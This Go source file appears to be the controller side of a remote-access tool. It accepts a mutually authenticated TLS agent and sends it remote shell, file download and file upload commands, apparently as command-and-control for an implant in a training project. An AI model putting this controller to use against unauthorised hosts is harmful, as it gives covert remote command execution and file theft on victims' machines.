package main

import (
	"bufio"
	"crypto/tls"
	"crypto/x509"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"
)

var agent struct {
	sync.Mutex
	conn net.Conn
	r    *bufio.Reader
	id   string
	peer string
}

var agentIO sync.Mutex

func main() {
	if len(os.Args) < 4 {
		fmt.Fprintf(os.Stderr, "usage: %s <cert> <key> <ca>\n", os.Args[0])
		os.Exit(1)
	}

	addr := os.Getenv("RKLINGS_LISTEN_ADDR")
	if addr == "" {
		addr = ":8443"
	}
	ln := listen(addr, os.Args[1], os.Args[2], os.Args[3])
	defer ln.Close()

	go startWeb()
	if os.Getenv("RKLINGS_NO_TUI") != "1" {
		go startTUI()
	}

	fmt.Printf("[*] Listening on %s for agent connections\n", addr)
	webAddr := os.Getenv("RKLINGS_WEB_ADDR")
	if webAddr == "" {
		webAddr = "127.0.0.1:8080"
	}
	fmt.Printf("[*] Webapp on http://%s\n", webAddr)

	for {
		conn, err := ln.Accept()
		if err != nil {
			log.Printf("accept: %v", err)
			continue
		}

		tlsConn := conn.(*tls.Conn)
		if err := tlsConn.Handshake(); err != nil {
			log.Printf("handshake: %v", err)
			conn.Close()
			continue
		}

		state := tlsConn.ConnectionState()
		if len(state.PeerCertificates) == 0 {
			log.Println("no client certificate, rejecting")
			conn.Close()
			continue
		}

		agentID := state.PeerCertificates[0].Subject.CommonName
		fmt.Printf("[+] Agent connected: %s\n", agentID)

		agent.Lock()
		if agent.conn != nil {
			agent.conn.Close()
		}
		agent.conn = conn
		agent.r = bufio.NewReader(conn)
		agent.id = agentID
		agent.peer = conn.RemoteAddr().String()
		agent.Unlock()
		recordEvent("connect", "agent connected: "+agentID)

	}
}

func listen(addr, certFile, keyFile, caFile string) net.Listener {
	cert, err := tls.LoadX509KeyPair(certFile, keyFile)
	if err != nil {
		log.Fatalf("load server cert: %v", err)
	}

	caCert, err := os.ReadFile(caFile)
	if err != nil {
		log.Fatalf("read CA cert: %v", err)
	}

	pool := x509.NewCertPool()
	if !pool.AppendCertsFromPEM(caCert) {
		log.Fatal("failed to parse CA cert")
	}

	ln, err := tls.Listen("tcp", addr, &tls.Config{
		Certificates: []tls.Certificate{cert},
		ClientCAs:    pool,
		ClientAuth:   tls.RequireAndVerifyClientCert,
		MinVersion:   tls.VersionTLS13,
	})
	if err != nil {
		log.Fatalf("listen: %v", err)
	}
	return ln
}

func sendToAgent(cmd string) (string, error) {
	agentIO.Lock()
	defer agentIO.Unlock()

	agent.Lock()
	conn := agent.conn
	r := agent.r
	agent.Unlock()

	if conn == nil {
		return "", fmt.Errorf("no agent connected")
	}

	if _, err := fmt.Fprintf(conn, "%s\n", cmd); err != nil {
		setOffline(conn)
		return "", fmt.Errorf("write: %w", err)
	}

	if strings.HasPrefix(cmd, "SHELL ") {
		var lines []string
		for {
			line, err := r.ReadString('\n')
			if err != nil {
				return strings.Join(lines, "\n"), err
			}
			line = strings.TrimRight(line, "\r\n")
			if line == "." {
				break
			}
			lines = append(lines, line)
		}
		return strings.Join(lines, "\n"), nil
	}

	if strings.HasPrefix(cmd, "DOWNLOAD ") {
		resp, err := r.ReadString('\n')
		if err != nil {
			return "", fmt.Errorf("no response")
		}
		resp = strings.TrimRight(resp, "\r\n")
		if strings.HasPrefix(resp, "ERR") {
			return resp, nil
		}
		size, err := strconv.ParseInt(resp, 10, 64)
		if err != nil {
			return resp, nil
		}
		buf := make([]byte, size)
		_, err = io.ReadFull(r, buf)
		if err != nil {
			return "", fmt.Errorf("read file: %w", err)
		}
		return string(buf), nil
	}

	resp, err := r.ReadString('\n')
	if err != nil {
		setOffline(conn)
		return "", fmt.Errorf("no response")
	}
	return strings.TrimRight(resp, "\r\n"), nil
}

func sendUploadToAgent(path string, data []byte) (string, error) {
	agentIO.Lock()
	defer agentIO.Unlock()
	agent.Lock()
	conn, reader := agent.conn, agent.r
	agent.Unlock()
	if conn == nil || reader == nil {
		return "", fmt.Errorf("no agent connected")
	}
	if _, err := fmt.Fprintf(conn, "UPLOAD %s\n%d\n", path, len(data)); err != nil {
		setOffline(conn)
		return "", err
	}
	if _, err := conn.Write(data); err != nil {
		setOffline(conn)
		return "", err
	}
	reply, err := reader.ReadString('\n')
	if err != nil {
		setOffline(conn)
		return "", err
	}
	return strings.TrimSpace(reply), nil
}

func setOffline(conn net.Conn) {
	disconnected := ""
	agent.Lock()
	if agent.conn == conn {
		disconnected = agent.id
		agent.conn = nil
		agent.r = nil
	}
	agent.Unlock()
	if disconnected != "" {
		recordEvent("disconnect", "agent disconnected: "+disconnected)
	}
}
